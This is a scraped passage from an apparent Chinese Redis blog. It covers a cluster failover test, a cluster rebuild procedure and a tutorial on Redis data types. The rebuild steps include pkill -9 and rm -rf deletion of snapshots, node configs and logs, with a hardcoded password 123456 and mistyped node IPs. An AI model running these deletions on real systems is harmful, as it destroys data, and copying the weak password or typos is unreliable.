283abb498445ffd6206f24c451ac0b9fb7129383 0 1616460016000 2 connected283abb498445ffd6206f24c451ac0b9fb7129383 192.168.1.109:7002@17002 master - 0 1616460016000 2 connected 10923-16383cde86683e2d314fd52cf8708f78935c6648ea3c6 192.168.1.109:7003@17003 slave 7a1229732ada6ae8d8eb51ae7b7cac6242a6f8d4 0 1616460017000 3 connected 验证主从切换，从上面的集群信息可以观察到 192.168.1.109:7003 节点是 192.168.1.109:7004 的 Slave 节点，因此可以 Kill 掉 192.168.1.109:7004 Master 节点的进程，然后观察 192.168.1.109:7003 节点会不会选举为新的 Master 节点，若可以则说明主从切换成功，此时 192.168.1.109:7003 节点的日志信息如下： 12345678911970:S 21 Jul 2020 22:48:40.080 * Connecting to MASTER 192.168.1.109:700411970:S 21 Jul 2020 22:48:40.080 * MASTER &lt;-&gt; REPLICA sync started11970:S 21 Jul 2020 22:48:40.081 # Error condition on socket for SYNC: Operation now in progress11970:S 21 Jul 2020 22:48:40.982 # Starting a failover election for epoch 7.11970:S 21 Jul 2020 22:48:40.985 # Failover election won: I\'m the new master.11970:S 21 Jul 2020 22:48:40.985 # configEpoch set to 7 after successful failover11970:M 21 Jul 2020 22:48:40.985 * Discarding previously cached master state.11970:M 21 Jul 2020 22:48:40.985 # Setting secondary replication ID to 00c7b21f3980b471d3373792d9d61bedf7e424e6, valid up to offset: 2059. New replication ID is c9f299ab0a8124a56d76e0e8a458135893b4533611970:M 21 Jul 2020 22:48:40.985 # Cluster state changed: ok 最后重新启动 192.168.1.109:7004 节点，可以发现它会变为 192.168.1.109:7003 节点的 Slave 节点 1234567a1229732ada6ae8d8eb51ae7b7cac6242a6f8d4 192.168.1.109:7004@17004 slave cde86683e2d314fd52cf8708f78935c6648ea3c6 0 1616461490000 7 connected225e37e5bb340467fb58b6f9d14cfb1893bf92d5 192.168.1.109:7001@17001 myself,master - 0 1616461492000 1 connected 0-5460f8a5d94e9928ed615514f23ddaabd259134af709 192.168.1.109:7006@17006 slave 225e37e5bb340467fb58b6f9d14cfb1893bf92d5 0 1616461492000 1 connected1f3f441d619ceeac55ae91015a3f46ede37352bb 192.168.1.109:7005@17005 slave 283abb498445ffd6206f24c451ac0b9fb7129383 0 1616461492010 2 connected283abb498445ffd6206f24c451ac0b9fb7129383 192.168.1.109:7002@17002 master - 0 1616461491000 2 connected 10923-16383cde86683e2d314fd52cf8708f78935c6648ea3c6 192.168.1.109:7003@17003 master - 0 1616461493010 7 connected 5461-10922 Redis 集群重建（初始化）若 Redis 集群出现无法正常使用的问题，可以尝试执行以下操作来重建 Redis 集群来解决，下述操作会删除 Redis 的所有 RDB 快照数据，切记先备份好数据再进行操作。 12345678910111213141516171819202122232425# 关闭所有节点服务器上的Redis$ pkill -9 redis# 在所有节点服务器上执行以下命令（切记先备份好Redis的快照数据）$ find /usr/local/redis-cluster -type f -iname "dump*.rdb" | xargs rm -rf$ find /usr/local/redis-cluster -type f -iname "nodes_*.conf" | xargs rm -rf$ rm -rf /var/log/redis/*# 启动所有节点服务器上的Redis$ ./usr/local/redis-cluster/start-cluster.sh# 执行集群构建操作$ redis-cli -a 123456 --cluster create \\192.168.109:7001 \\192.168.109:7002 \\192.168.109:7003 \\192.168.109:7004 \\192.168.109:7005 \\192.168.109:7006 \\--cluster-replicas 1# 查询集群信息和状态$ redis-cli -c -p 7001 -a 123456127.0.0.1:7001&gt; cluster info127.0.0.1:7001&gt; cluster nodes 参考博客 Redis 6 高可用集群搭建 Redis 两台服务器组集群 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux 缓存"},{title:"Redis 入门教程之一五大数据类型",url:"/posts/fea85f3.html",text:'系统级命令获取符合规则的键名列表KEYS 命令需要遍历 Redis 中的所有键，当键的数量较多时会严重影响性能，在生产环境中应该禁用该命令。 1KEYS pattern 示例： 12redis&gt; KEYS *1) "book" pattern 支持 Glob 风格的通配符格式： 符号 含义 ? 匹配一个字符 * 匹配任意个（包括 0 个）字符 [ ] 匹配括号间的任一字符，可以使用 “-” 符号来表示一个范围，如 a [b-d] 可以匹配 “ab”、”ac”、”ad” \\x 匹配字符 x，用于转义字符，如需要匹配 “?” 就需要使用 \\? 判断一个键是否存在如果键存在则返回整数类型 1，否则返回 0。 1EXISTS key 示例： 12345redis&gt; EXISTS book(integer) 1redis&gt; EXISTS noexists(integer) 0 删除键可以删除一个或多个键，返回值是删除的键的个数。 1DEL key 示例： 12345redis&gt; DEL book(integer) 1redis&gt; DEL noexists(integer) 0 DEL 命令的参数不支持通配符，但可以结合 Linux 的管道和 xargs 命令实现删除所有符合规则的键。比如要删除以 “user:” 开头的键，就可以执行以下命令： 1$ redis-cli KEYS "user:*" | xargs redis-cli DEL 另外由于 DEL 命令支持多个键作为参数，所以还可以执行以下命令来达到同样的效果，但是性能更好： 1$ redis-cli DEL `redis-cli KEYS "user:*"` 获得键值的数据类型1TYPE key 示例： 12127.0.0.1:6379&gt; type bookstring 清空当前数据库1FLUSHDB [ASYNC] 清空所有数据库1FLUSHALL [ASYNC] 设置过期时间1EXPIRE key seconds 查看剩余存活时间1TTL key 数据类型字符串类型（String）字符串类型是 Redis 中最基础的数据类型，它能存储任何形式的字符串，包括二进制数据。例如存储用户的邮箱、JSON 化的对象甚至是一张图片。一个字符串类型键允许存储的最大容量是 512 MB。字符串类型是其他 4 种数据类型的基础，其他数据类型和字符串类型的差别从某种角度来说只是组织字符串的形式不同。例如，列表类型（List）是以列表的形式组织字符串，而集合类型是以集合的形式组织字符串。 赋值与取值（字符串）123SET key valueGET key 示例： 12345redis&gt; SET book javaOKredis&gt; GET book"java" 取值时，当键不存在时，会返回空结果。 递增数字字符串类型可以存储任何形式的字符串，当存储的字符串是整数形式时，Redis 提供了一个实用的命令 INCR，其作用是让当前键值递增 1，并返回递增后的值。 1INCR key 示例： 12345redis&gt; INCR num(integer) 1redis&gt; INCR num(integer) 2 当要操作的键不存在时，会创建该键并设置值为 0，所以第一次递增后的结果为 1。 1234redis&gt; SET foo barredis&gt; INCR foo(error) ERR value is not an integer or out of range 当键值不是整数时，Redis 会提示错误。 增加指定的整数INCRBY 命令与 INCR 命令级别一样，只不过前者可以通过 increment 参数指定一次增加的数值。 1INCRBY key increment 示例： 12345redis&gt; INCRBY bar 2(integer) 2redis&gt; INCRBY bar 3(integer) 5 减少指定的整数DECR 命令与 INCR 命令的用法相同，只不过是让键值递减 1。 1DECR key 示例： 12redis&gt; DECR car(integer) -1 DECRBY 与 INCRBY 命令的用法相同，可以通过 increment 参数指定一次递减的数值。 1DECRBY key increment 示例： 12345redis&gt; DECRBY cat 3(integer) -3redis&gt; DECRBY cat 5(integer) -8 增加指定的浮点数INCRBYFLOAT 命令类似 INCRBY 命令，差别是 INCRBYFLOAT 可以递增一个双精度浮点数。 1INCRBYFLOAT key pattern 示例： 12345redis&gt; INCRBYFLOAT bar 2.7"2.7"redis&gt; INCRBYFLOAT bar 5E+4"50002.69999999999999929" 向尾部追加值APPEND 的作用是向键值的末尾追加 value。如果键不存在，则会创建该键并设置值为 value，返回值是追加后字符串的总长度。 1APPEND key value 示例： 12345678redis&gt; set key helloOKredis&gt; APPEND key " world!"(integer) 12redis&gt; GET key"hello world!" 获取字符串长度STRLEN 命令返回键值的长度，如果键不存在则返回 0。 1STRLEN key 示例： 12345678redis&gt; STRLEN key(integer) 12redis&gt; set key 你好OKredis&gt; STRLEN key(integer) 6 同时获取 / 设置多个键值123MGET key [key ...]MSET key value [key value ...] 示例： 123456redis&gt; MSET key1 v1 key2 v2 key3 v3redis&gt; MGET key1 key2 key31) "v1"2) "v2"3) "v3" 位操作位操作命令： 123456789GETBIT key offsetSETBIT key offset valueBITCOUNT key [start] [end]BITOP operation destkey key [key ...]BITPOS key value [start] [end] 一个字节由 8 个二进制位组成，Redis 提供了上述 4 个命令可以直接对二进制位进行操作。为了演示，首先将 foo 键赋值为 bar： 12redis&gt; SET foo bar(integer) 0 bar 的 3 个字母 “b”、”a”、”r” 对应的 ASCII 码分别是 98、97 和 114，转换成二进制后分别为 1100010、1100001、1110010，所以 foo 键中的二进制位结构图如下： GETBIT 命令可以获取一个字符串类型键指定位置的二进制位的值（0 或 1），索引从 0 开始。如果需要获取的二进制位的索引超出了键值的二进制位的实际长度，则默认值为 0。 12345678redis&gt; GETBIT foo 0(integer) 0redis&gt; GETBIT foo 6(integer) 1redis&gt; GETBIT foo 100000(integer) 0 SETBIT 命令可以设置字符串类型键指定位置的二进制位的值，返回值是该位置的旧值。如果要将 foo 键值设置为 aar，那么可以通过位操作将 foo 键的二进制位的索引第 6 位设置为 0，第 7 位设置为 1。 12345678redis&gt; SETBIT foo 6 0(integer) 1redis&gt; SETBIT foo 7 1(integer) 0redis&gt; GET foo"aar" 如果要设置的位置超过了键值的二进制的长度，SETBIT 命令会自动将中间的二进制位设置为 0；同理设置一个不存在的键的指定二进制位的值，会自动将前面的位赋值为 0。 12345redis&gt; SETBIT nofoo 10 1(integer) 0redis&gt; GETBIT nofoo 5(integer) 0 BITCOUNT 命令可以获得字符串类型键中值是 1 的二进制位个数，例如： 12345redis&gt; set foo barOKredis&gt; BITCOUNT foo(integer) 10 BITCOUNT 可以通过参数限制统计的字节范围，例如只希望统计前两个字节（即 “fo”），字节范围从 0 开始： 12345redis&gt; set foo barOKredis&gt; BITCOUNT foo 0 1(integer) 6 BITOP 命令可以对多个字符串类型键进行位运算，并将结果存储在 destkey 参数指定的键中。BITOP 命令支持的运算操作有 AND、OR、XOR 和 NOT。例如可以对 bar 和 aar 进行 OR 运算： 1234567891011redis&gt; set foo1 barOKredis&gt; set foo2 aarOKredis&gt; BITOP OR res foo1 foo2(integer) 3redis&gt; GET res"car" 具体的位运算过程如下图： BITPOS 命令可以获得指定键的第一个位值是 0 或者 1 的位置。以 “bar” 这个键值为例，如果想获取键值中的第一个二进制位值为 1 的位置（从 0 开始算起），则可以执行： 12345redis&gt; SET foo barOKredis&gt; BITPOS foo 1(integer) 1 对比上面位运算的过程图，正如 BITPOS 命令的执行结果所示，”bar” 中第一个值为 1 的二进制位的位置为 1（同其他命令一样，BITPOS 命令的索引也是从 0 开始算起）。如果希望指定二进制位的查询范围，那么可以使用 BITPOS 命令的第二个和第三个参数，它们分别用来指定要查询的起始字节（从 0 开始算起）和结束字节。特别注意，这里第二个和第三个参数的单位不再是二进制位，而是字节。而返回的结果（位置）是从头开始算起的，与起始字节无关。如果不设置结束字节且键值的所有二进制位都是 1 的时候，则当要查询值为 0 的二进制位的位置时，返回结果会是键值长度的下一个字位的位置，这是因为 Redis 会认为键值长度之后的二进制位都是 0。举个例子，如果想查询第二个字节到第三个字节之间（即 “a” 和 “r”）出现的第一个值为 1 的二进制位的位置，则可以执行： 12345redis&gt; SET foo barOKredis&gt; BITPOS foo 1 1 2(integer) 9 位操作应用举例： 利用位操作命令可以非常紧凑地存储布尔值。比如假设网站的每个用户都有一个递增的整数 ID，如果使用一个字符串类型键配合位操作来记录每个用户的性别（用户 ID 作为索引，二进制位值 1 和 0 表示男性和女性），那么记录 100 万个用户的性别只需占用 100 KB 多的空间，而且由于 GETBIT 和 SETBIT 的时间复杂度都是 O (1)，所以读取二进制位值性能很高。 SETBIT 命令使用注意事项： 使用 SETBIT 命令时，如果当前键的键值长度小于要设置的二进制位的位置时，Redis 会自动分配内存并将键值的当前长度到指定的位置之间的二进制位都设置为 0。此时如果要分配的内存过大，则很可能会造成服务器的暂时阻塞而无法处理同一时间的其他请求。还是举刚才存储网站用户性别的例子，如果这个网站的用户 ID 是从 100000001 开始的，那么会造成 10 多 MB 的浪费，正确的做法是给每个用户的 ID 减去 100000000 再进行存储。 散列类型（Hash）Redis 是采用字典结构以键值对的形式存储数据的，而散列类型（Hash）的键值是一种字典结构，其存储了字段（Field）和字段值的映射，但字段值只能是字符串，不支持其他数据类型，即散列类型不能嵌套其他的数据类型。一个散列类型键可以包含之多 2^32 - 1 个字段。除了散列类型，Redis 的其他数据类型同样不支持数据类型嵌套。比如集合类型的每个元素都只能是字符串，不能是另一个集合或散列表等。散列类型适合存储对象：使用对象类别和 ID 构成键名，使用字段表示对象的属性，而字段值则存储属性值。例如要存储 ID 为 2 的汽车对象，可以分别使用名为 color、name 和 price 的 3 个字段来存储该辆汽车的颜色、名称和价格，具体存储结构图如下： 对比关系数据库中存储的汽车对象： 关系型数据库中，数据是以二维表的形式存储的，这就要求所有的记录都拥有相同的属性，无法单独为某条记录增减属性。如果想为 ID 为 1 的汽车增加生产日期的属性，就需要吧数据表更改为如上图所示的结构。增加一个属性后对于 ID 为 2 和 3 的两条记录而言 data 字段是冗余的。而 Redis 的散列类型则不存在这个问题，上图中描述了汽车对象的存储结构，但是这个结构只是人为的约定，Redis 并不强制要求每个键都依据此结构存储，完全可以自由地为任何键增减字段而不影响其他键。 赋值与取值（散列）赋值与取值命令： 123456789HSET key field valueHGET key fieldHMSET key field value [field value ...]HMGET key field [field ...]HGETALL key 示例： 12345678redis&gt; HSET car price 500(integer) 1redis&gt; HSET car name BMW(integer) 1redis&gt; HGET car name"BMW" HSET 命令的方便之处在于不区分新增和更新操作，这意味着修改数据时不用事先判断字段是否存在来决定要执行的是新增操作（inert）还是更新操作（update）。当执行的是新增操作时（即之前字段不存在）HSET 命令会返回 1，当执行的是更新操作时（即之前字段已经存在）HSET 命令会返回 0。更进一步，当键本身不存在时，HSET 命令还会自动创建它。值得注意的是，Redis 中每个键都属于一个明确的数据类型，如通过 HSET 命令建立的键是散列类型，通过 SET 命令建立的键是字符串类型等等。使用一种数据类型的命令操作另一种数据类型的键会提示错误：”ERR Operation against a key holding the wrong kind of value”；但并不是所有命令都如此，比如 SET 命令可以覆盖已经存在的键而不管原来的键是什么类型。 若需要同时设置、获取多个字段的值时，可以使用 HMSET、HMGET 命令： 123456redis&gt; HMSET car2 price 500 name BMWOKredis&gt; HMGET car2 price name1) "500"2) "BMW" 若想获取键中所有字段和字段值却不知道键中有哪些字段，则应该使用 HGETALL 命令： 12345redis&gt; HGETALL car1) "price"2) "500"3) "name"4) "BMW" 判断字段是否存在HEXISTS 命令用来判断一个字段是否存在，如果存在则返回 1，否则返回 0（如果键不存在也会返回 0）。 1HEXISTS key field 示例： 12345678redis&gt; HEXISTS car model(integer) 0redis&gt; HSET car model c200(integer) 1redis&gt; HEXISTS car model(integer) 1 当字段不存在时赋值HSETNX 命令与 HSET 命令类似，区别在于如果字段已经存在，HSETNX 命令将不执行任何操作。HSETNX 命令中的 “NX” 表示 “If Not Exists”（如果不存在），同时 HSETNX 命令是原子操作，不用担心竞态条件，可以用作分布式锁的实现。 1HSETNX key field value 示例： 12345678redis&gt; HSET car model c200(integer) 1redis&gt; HSETNX car model c300(integer) 0redis&gt; HGET car model"c200" 增加字段HINCRBY 与 INCR、INCRBY 命令类似，可以使字段值增加指定的整数。散列类型没有 HINCR 命令，但可以通过 HINCRBY key field 1 来实现。 1HINCRBY key field increment 示例： 12345redis&gt; HINCRBY person score 60(integer) 60redis&gt; HGET person score"60" 当 persion 键不存在时，HINCRBY 命令会自动建立该键，并设置字段 score 的默认值为 0，然后再执行自增操作，命令的返回结果是增值后的字段值。 删除字段HDEL 命令可以删除一个或多个字段，返回值是被删除的字段个数。 1HDEL key field [field ...] 示例： 12345redis&gt; HDEL car name(integer) 1redis&gt; HDEL car name(integer) 0 只获取字段名或字段值若仅仅需要获取键中所有字段的名称或者字段值，那么可以使用 HKEYS、HVALS 命令： 123HKEYS keyHVALS key 示例： 1234567redis&gt; HKEYS car1) "price"2) "model"redis&gt; HVALS car1) "500"2) "c200" 列表类型（List）列表类型（List）可以存储一个有序的字符串列表，常用的操作是向列表两端添加元素，或者获得列表的某一个片段。列表类型内部是使用双向链表（double linked list）实现的，所以向列表两端添加元素的时间复杂度为 O (1)，获取越接近两端的元素速度就越快。这意味着即使是一个有几千万个元素的列表，获取头部或尾部的 10 条记录也是极快的（和从只有 20 个元素的列表中获取头部或尾部的 10 条记录的速度是一样的），不过使用链表的代价是通过索引访问元素比较慢，其元素遍历速度要远慢于数组。这种特性使列表类型能非常快速地完成关系数据库难以应付的场景：如社交网站的新鲜事，用户关心的只是最新的内容，使用列表类型存储，即使新鲜事的总数达到几千万个，获取其中最新的 100 条数据也是极快的。同样因为在两端插入记录的时间复杂度是 O (1)，列表类型也适合用来记录日志，可以保证加入新日志的速度不会受到已有日志数量的影响。与散列类型键最多能容纳的字段数量相同，一个列表类型键最多能容纳 2^32 − 1 个元素。借助列表类型，Redis 还可以作为队列使用。 向列表两端添加元素LPUSH 命令用来向列表左边添加元素，返回值表示添加元素后列表的总长度。 123LPUSH key value [value …]RPUSH key value [value …] 示例： 12345redis&gt; LPUSH numbers 1(integer) 1redis&gt; LPUSH numbers 2 3(integer) 3 当通过 LPUSH 命令往列表中依次添加 “1”、”2“、”3“ 时，numbers 键中的数据如下图所示： 使用 RPUSH 命令向列表右边添加元素的话，其用法和 LPUSH 命令一样： 12redis&gt; RPUSH numbers 0 -1(integer) 3 此时 numbers 键中的数据如下图所示： 从列表两端弹出元素有进有出，LPOP 命令可以从列表左边弹出一个元素。LPOP 命令执行两步操作：第一步是将列表左边的元素从列表中移除，第二步是返回被移除的元素值。 123LPOP keyRPOP key 示例： 12345redis&gt; LPOP numbers"3"redis&gt; RPOP numbers"-1" 从 numbers 列表左边弹出一个元素（也就是 ”3“），同时列表右边也弹出一个元素（即”-1“），此时 numbers 键中的数据如下图所示： 综合 LPUSH、RPUSH、LPOP、RPOP 命令，可以使用列表类型来模拟栈和队列的操作。如果想把列表当做栈，则搭配使用 LPUSH、LPOP 或 RPUSH、RPOP。如果想当成队列，则搭配使用 LPUSH、RPOP 或 RPUSH、LPOP。 获取列表中元素的个数当键不存在时，LLEN 命令会返回 0。 1LLEN key 示例： 12redis&gt; LLEN numbers(integer) 3 LLEN 命令的功能类似 SQL 语句 SELECT COUNT(*) FROM table_name，但是 LLEN 的时间复杂度为 O (1)，使用时 Redis 会直接读取现成的值，而不需要像部分关系数据库（如使用 InnoDB 存储引擎的 MySQL 表）那样需要遍历一遍数据表来统计条目数量。 获得列表片段LRANGE 命令是列表类型最常用的命令之一，它能够获得列表中的某一片段。LRANGE 命令将返回索引从 start 到 stop 之间的所有元素（包含两端的元素：start、stop），Redis 的列表起始索引为 0。LRANGE 命令在取得列表片段时，不会像 LPOP 一样删除该片段。 1LRANGE key start stop 示例： 1234redis&gt; LRANGE numbers 0 21) "2"2) "1"3) "0" LRANGE 命令也支持负索引，表示从右边开始计算序数，如 “-1” 表示最右边第一个元素，”-2” 表示最右边第二个元素，依次类推。显然，LRANGE numbers 0 -1 可以获取列表中的所有元素。 12345678redis&gt; LRANGE numbers 0 -11) "2"2) "1"3) "0"redis&gt; LRANGE numbers -2 -11) "1"2) "0" 虽然 LRANGE numbers 0 -1 可以获取列表中的所有元素，但存在一些特殊情况如下： 如果 start 的索引位置比 stop 的索引位置靠后，则会返回空列表 如果 stop 大于实际的索引范围，则会返回到列表最右边的元素 删除列表中指定的值1LREM key count value LREM 命令会删除列表中前 count 个值为 value 的元素，返回值是实际删除的元素个数。根据 count 值的不同，LREM 命令的执行方式会略有差异，具体如下： 当 count &gt; 0 时 LREM 命令会从列表左边开始删除前 count 个值为 value 的元素。 当 count &lt; 0 时 LREM 命令会从列表右边开始删除前 |count| 个值为 value 的元素。 当 count = 0 是 LREM 命令会删除所有值为 value 的元素。 示例： 1234567891011121314redis&gt; LRANGE numbers 0 -11) "2"2) "1"3) "0"4) "2"# 从右边开始删除第一个值为”2“的元素redis&gt; LREM numbers -1 2(integer) 1redis&gt; LRANGE numbers 0 -11) "2"2) "1"3) "0" 获取与设置指定索引的元素值如果要将列表类型当作数组来用，LINDEX 命令是必不可少的。LINDEX 命令用来返回指定索引的元素，索引从 0 开始。 123LINDEX key indexLSET key index value 示例： 12345678redis&gt; LRANGE numbers 0 -11) "4"2) "3"3) "2"4) "1"redis&gt; LINDEX numbers 1"3" LSET 是另一个通过索引操作列表的命令，它会将索引为 index 的元素赋值为 value。 1234567891011redis&gt; LRANGE numbers 0 -11) "4"2) "3"3) "2"4) "1"redis&gt; LSET numbers 1 10OKredis&gt; LINDEX numbers 1"10" 只保留列表指定片段LTRIM 命令可以删除指定索引范围之外的所有元素，其指定列表范围的方法和 LRANGE 命令相同，即保留索引从 start 到 stop 之间的所有元素（包含两端的元素：start、stop）。 1LTRIM key start stop 示例： 123456789101112redis&gt; LRANGE numbers 0 -11) "4"2) "3"3) "2"4) "1"redis&gt; LTRIM numbers 1 2OKredis&gt; LRANGE numbers 0 -11) "3"2) "2" LTRIM 命令常和 LPUSH 命令一起使用来限制列表中元素的数量，比如记录日志时希望只保留最近的 100 条日志，则每次加入新元素时调用一次 LTRIM 命令即可： 123LPUSH logs $newLogLTRIM logs 0 99 向列表中插入元素LINSERT 命令首先会在列表中从左到右查找值为 pivot 的元素，然后根据第二个参数是 BEFORE 还是 AFTER 来决定将 value 插入到该元素的前面还是后面，命令的返回值是插入后列表的元素个数。 1LINSERT key BEFORE|AFTER pivot value 示例： 123456789101112131415redis&gt; LRANGE numbers 0 -11) "4"2) "3"3) "2"4) "1"redis&gt; LINSERT numbers after 1 0(integer) 5redis&gt; LRANGE numbers 0 -11) "4"2) "3"3) "2"4) "1"5) "0" 将元素从一个列表转到另一个列表RPOPLPUSH 是个很有意思的命令，从名字就可以看出它的功能：先执行 RPOP 命令再执行 LPUSH 命令。RPOPLPUSH 命令会先从 source 列表类型键的右边弹出一个元素，然后将其加入到 destination 列表类型键的左边，并返回这个元素的值，整个过程是原子的。 1RPOPLPUSH source destination 当把列表类型作为队列使用时，RPOPLPUSH 命令可以很直观地在多个队列中传递数据。当 source 和 destination 相同时，RPOPLPUSH 命令会不断地将队尾的元素移到队首，借助这个特性可以实现一个网站监控系统：使用一个队列存储需要监控的网址，然后监控程序不断地使用 RPOPLPUSH 命令循环取出一个网址来测试可用性。这里使用 RPOPLPUSH 命令的好处在于在程序执行过程中仍然可以不断地向网址列表中加入新网址，而且整个系统容易扩展，允许多个客户端同时处理队列。 列表阻塞操作BLPOP 命令是 LPOP 命令的阻塞版本，当给定列表内没有任何元素可供弹出的时候，Redis 连接将被 BLPOP 命令阻塞，直到等待超时或发现可弹出元素为止。超时参数 timeout 接受一个以秒为单位的数字作为值，设为 0 表示阻塞时间可以无限期延迟。当给定多个 Key 参数时，BLPOP 命令会按参数 Key 的先后顺序依次检查各个列表，弹出第一个非空列表的头元素，并和被弹出元素所属的列表的名字一起，组成结果返回给调用者。如果所有给定 Key 都不存在或包含空列表，那么 BLPOP 命令将阻塞连接直到等待超时，或者有另一个客户端对给定 Key 的任意一个执行 LPUSH 或 RPUSH 命令为止。BRPOP、BRPOPLPUSH 命令与 BLPOP 命令类似，这里不再累述。 12345BLPOP key [key ...] timeoutBRPOP key [key ...] timeoutBRPOPLPUSH source destination timeout 示例：假设现在有 job 、 command 和 request 三个列表，其中 job 不存在， command 和 request 都持有非空列表。 123456789redis&gt; LPUSH command "update system"(integer) 1redis&gt; LPUSH request "visit page"(integer) 1redis&gt; BLPOP job command request 01) "command"2) "update system..." 上面的例子中，BLPOP 命令返回的元素来自 command 列表，因为它是按” 查找 job -&gt; 查找 command -&gt; 查找 request “这样的顺序，找到第一个非空列表 command。 集合类型（Set）在集合中的每个元素都是不同的，且没有顺序。一个集合类型键可以存储至多 2^32 - 1 个字符串。集合类型与散列类型的对比如下： 比较内容 集合类型 列表类型 存储内容 至多 2^32 - 1 个字符串 至多 2^32 - 1 个字符串 有序性 否 是 唯一性 是 否 集合类型的常用操作是向集合中加入或删除元素、判断某个元素是否存在等。由于集合类型在 Redis 内部是使用值为空的散列表（Hash Table）实现的，所以这些操作的时间复杂度都是 O (1)。最方便的是多个集合类型键之间还可以进行并集、交集和差集运算。 增加、删除元素SADD 命令用来向集合中增加一个或多个元素，如果键不存在则会自动创建。因为在一个集合中不能有相同的元素，所以如果要加入的元素已经存在于集合中就会忽略这个元素。该命令的返回值是成功加入的元素数量（忽略的元素不计算在内）。 1SADD key member [member …] 示例： 12345redis&gt; SADD letters a(integer) 1redis&gt; SADD letters a b c(integer) 2 SREM 命令用来从集合中删除一个或多个元素，并返回删除成功的个数。 1SREM key member [member …] 示例： 12redis&gt; SREM letters b c(integer) 2 获取集合中的所有元素SMEMBERS 命令会返回集合中的所有元素。 1SMEMBERS key 示例： 123redis&gt; SMEMBERS letters1) "a"2) "b" 判断元素是否在集合中判断一个元素是否在集合中是一个时间复杂度为 O (1) 的操作，无论集合中有多少个元素，SISMEMBER 命令始终可以极快地返回结果。当值存在时 SISMEMBER 命令返回 1，当值不存在或键不存在时返回 0。 1SISMEMBER key member 示例： 12redis&gt; SISMEMBER letters a(integer) 1 集合间运算集合间运算命令（差集、交集、并集）： 12345SDIFF key [key ...]SINTER key [key ...]SUNION key [key ...] SDIFF 命令用来对多个集合执行差集运算。集合 A 与集合 B 的差集表示为 A−B，代表所有属于 A 且不属于 B 的元素构成的集合。 1234567891011redis&gt; SADD setA 1 2 3(integer) 3redis&gt; SADD setB 2 3 4(integer) 3redis&gt; SDIFF setA setB1) "1"redis&gt; SDIFF setB setA1) "4" SDIFF 命令自持同时传入多个键，下面的例子中，计算顺序是先计算 setA 与 setB 的差集，再计算结果与 setC 的差集。 1234567891011redis&gt; SADD setA 1 2 3(integer) 3redis&gt; SADD setB 2 3 4(integer) 3redis&gt; SADD setC 2 3(integer) 2redis&gt; SDIFF setA setB setC1) "1" SINTER 命令用来对多个集合执行交集运算。集合 A 与集合 B 的交集表示为 A ∩ B，代表所有属于 A 且属于 B 的元素构成的集合。SINTER 同样支持同时传入多个键。 123456789redis&gt; SADD setA 1 2 3(integer) 3redis&gt; SADD setB 2 3 4(integer) 3redis&gt; SINTER setA setB1) "2"2) "3" SUNION 命令用来对多个集合执行并集运算。集合 A 与集合 B 的并集表示为 A ∪ B，代表所有属于 A 或者属于 B 的元素构成的集合。SUNION 同样支持同时传入多个键。 1234567891011redis&gt; SADD setA 1 2 3(integer) 3redis&gt; SADD setB 2 3 4(integer) 3redis&gt; SUNION setA setB1) "1"2) "2"3) "3"4) "4" 获取集合中元素的个数SCARD 命令用来获得集合中的元素个数。 1SCARD key 示例： 12345678redis&gt; SMEMBERS setA1) "b"2) "d"3) "a"4) "c"redis&gt; SCARD setA(integer) 4 进行集合运算并将结果存储12345SDIFFSTORE destination key [key …]SINTERSTORE destination key [key …]SUNIONSTORE destination key [key …] SDIFFSTORE 命令和 SDIFF 命令功能一样，唯一的区别就是前者不会直接返回运算结果，而是将结果存储在 destination 键中。 SDIFFSTORE 命令常用于需要进行多步集合运算的场景中，如需要先计算差集再将结果和其他键计算交集。 SINTERSTORE 、 SUNIONSTORE 命令与 SDIFFSTORE 类似，不再赘述。 随机获得集合中的元素SRANDMEMBER 命令用来随机从集合中获取一个元素，还可以传递 count 参数来一次随机获得多个元素。根据 count 的正负不同，SRANDMEMBER 命令的具体表现也不同： 当 count 为正数时，SRANDMEMBER 会随机从集合里获得 count 个不重复的元素。如果 count 的值大于集合中的元素个数，则 SRANDMEMBER 会返回集合中的全部元素。 当 count 为负数时，SRANDMEMBER 会随机从集合里获得 |count| 个的元素，这些元素有可能相同。 SRANDMEMBER 命令返回的结果并不是非常随机的，根本原因是由集合类型的存储结构（Hash Table）决定的，点击查看详细解释 1SRANDMEMBER key [count] 示例： 123456789101112131415161718192021redis&gt; SMEMBERS setA1) "b"2) "d"3) "a"4) "c"redis&gt; SRANDMEMBER setA"b"redis&gt; SRANDMEMBER setA 11) "c"redis&gt; SRANDMEMBER setA -21) "c"2) "c"redis&gt; SRANDMEMBER setA 51) "b"2) "a"3) "d"4) "c" 从集合中弹出一个元素由于集合类型的元素是无序的，所以 SPOP 命令会从集合中随机选择一个元素弹出。 1SPOP key 示例： 12345678redis&gt; SMEMBERS setA1) "b"2) "d"3) "a"4) "c"redis&gt; SPOP setA"c" 有序集合类型（Sorted Set）在集合类型的基础上有序集合类型为集合中的每个元素都关联了一个分数，这使得不仅可以完成插入、删除和判断元素是否存在等集合类型支持的操作，还能够获得分数最高（或最低）的前 N 个元素、获得指定分数范围内的元素等与分数有关的操作。虽然集合中每个元素都是不同的，但是它们的分数却可以相同。 有序集合类型和列表类型的相同点： 都是有序的 都可以获得某一范围的元素 有序集合类型和列表类型的不同点： 列表类型是通过双向链表实现的，获取靠近两端的数据速度极快，而当元素增多后，访问中间数据的速度会较慢，所以它更加适合实现如 “新鲜事” 或 “日志” 这样很少访问中间元素的应用 有序集合类型是使用散列表（Hash Table）和跳跃表（Skip List）实现的，所以即使读取位于中间部分的数据速度也很快，时间复杂度是 O (log (N)) 列表中不能简单地调整某个元素的位置，但是有序集合可以（通过更改这个元素的分数） 有序集合要比列表类型更耗费内存 增加元素ZADD 命令用来向有序集合中加入一个元素和该元素的分数，如果该元素已经存在则会用新的分数替换原有的分数。ZADD 命令的返回值是新加入到集合中的元素个数（不包含之前已经存在的元素）。 1ZADD key score member [score member …] 示例： 12345redis&gt; ZADD scoreboard 89 Tom 67 Peter 100 Jim(integer) 3redis&gt; ZADD scoreboard 80 Peter(integer) 